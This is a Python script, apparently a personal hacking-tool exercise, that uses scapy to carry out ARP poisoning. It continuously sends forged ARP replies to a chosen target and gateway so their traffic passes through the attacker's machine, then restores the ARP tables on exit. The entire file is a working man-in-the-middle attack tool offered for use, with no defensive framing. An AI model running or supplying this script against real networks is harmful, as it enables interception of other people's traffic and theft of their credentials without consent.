import scapy.all as scp
import time
import optparse as opt

def get_mac (ip):
    arp_request = scp.ARP(pdst = ip)
    broadcast = scp.Ether(dst = "ff:ff:ff:ff:ff:ff")
    both = broadcast / arp_request
    answered = scp.srp(both, timeout=1 ,verbose = False) [0]
    return answered[0][1].hwsrc

def arp_poisoning(target_ip,poisoned_ip):
    target_mac = get_mac(target_ip)
    arp_response = scp.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)  # op=2 to generate arp response 
    scp.send(arp_response,verbose = False)

def reset(ip1,ip2):
    ip1_mac = get_mac(ip1)
    ip2_mac = get_mac(ip2)
    arp_response = scp.ARP(op=2,pdst=ip1,hwdst=ip1_mac,psrc=ip2,hwsrc=ip2_mac)  # op=2 to generate arp response 
    scp.send(arp_response,verbose = False)

def get_input ():
    object1 = opt.OptionParser()
    object1.add_option("-t","--target",dest="target_ip",help="Enter target ip")
    object1.add_option("-g","--gateway",dest="gateway_ip",help="Enter gateway ip")
    options = object1.parse_args()[0]
    if not options.target_ip:
        print("Enter target ip")
    if not options.gateway_ip:
        print("Enter gateaway ip")

    return options
ips = get_input()
user_target_ip = ips.target_ip
user_gateway_ip = ips.gateway_ip

try:
    while True:
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        print("\rSending packets",end = "") #this one python3 attribute
        time.sleep(5)

except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset(user_target_ip,user_gateway_ip)
    reset(user_gateway_ip,user_target_ip)
